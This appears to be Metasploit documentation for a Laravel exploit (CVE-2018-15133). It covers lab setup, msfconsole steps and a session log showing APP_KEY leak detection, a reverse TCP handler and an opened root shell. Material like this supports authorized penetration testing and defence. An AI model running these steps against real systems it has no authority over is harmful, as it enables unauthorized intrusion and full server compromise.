## Vulnerable Application

[Laravel](https://laravel.com/) is an actively-maintained PHP Framework web development suite

This module exploits an unauthenticated vulnerability that allows for PHP object deserialization and command execution

The vulnerability was discovered by [StÃ¥le Pettersen](https://github.com/kozmic/laravel-poc-CVE-2018-15133)
Also uses https://nvd.nist.gov/vuln/detail/CVE-2017-16894 to check for a leaked key.
Finally checks for another leaked key method which may not be known and perhaps 0day?


### Setting up Laravel on Debian

git clone https://github.com/kozmic/laravel-poc-CVE-2018-15133
Edit Dockerfile and change sed -i -e 's/5.7.\*/5.6.29/g' to sed -i -e 's/5.8.\*/5.6.29/g'
docker build -t laravel-poc-cve-2018-15133
docker run -d -p 8000:8000 laravel-poc-cve-2018-15133

## Verification Steps

- Start `msfconsole`
- `use exploits/unix/http/laravel_token_unserialize_exec`
- `set RHOST 1.2.3.4`
- `set RPORT 8000` (for Docker image)
- `set APP_KEY base64_string` (optional)
- `set VERBOSE true` (optional)
- `check`
- `exploit`

## Scenarios

msf5 > use exploit/unix/http/laravel_token_unserialize_exec 
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 1.2.3.4
RHOSTS => cloudapp1
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set RPORT 8000
RPORT => 8000
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set VERBOSE true
VERBOSE => true
msf5 exploit(unix/http/laravel_token_unserialize_exec) > check

[*] 1.2.3.4:8000 - No APP_KEY set. Will try to find it...
[*] 1.2.3.4:8000 - Checking for CVE-2017-16894 .env information leak.
[*] 1.2.3.4:8000 - Checking for Laravel Framework information leak.
[*] 1.2.3.4:8000 - Laravel Framework throws an error!
[*] 1.2.3.4:8000 - Target appears to be vulnerable
[*] 1.2.3.4:8000 - APP_KEY Found via Laravel Framework error information leak: +hYWnYjz5mGnw92MgZHJJ/mgmoKietP8ZSYL4u+1rvk=
[+] 1.2.3.4:8000 - The target is vulnerable.
msf5 exploit(unix/http/laravel_token_unserialize_exec) > exploit 

[-] Handler failed to bind to 1.2.3.1:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] 1.2.3.4:8000 - No APP_KEY set. Will try to find it...
[*] 1.2.3.4:8000 - Checking for CVE-2017-16894 .env information leak.
[*] 1.2.3.4:8000 - Checking for Laravel Framework information leak.
[*] 1.2.3.4:8000 - Laravel Framework throws an error!
[*] 1.2.3.4:8000 - Target appears to be vulnerable
[*] 1.2.3.4:8000 - APP_KEY Found via Laravel Framework error information leak: +hYWnYjz5mGnw92MgZHJJ/mgmoKietP8ZSYL4u+1rvk=
[*] Command shell session 1 opened (1.2.3.1:4444 -> 1.2.3.4:48772) at 2019-07-06 12:41:31 +1000
id

uid=0(root) gid=0(root) groups=0(root)

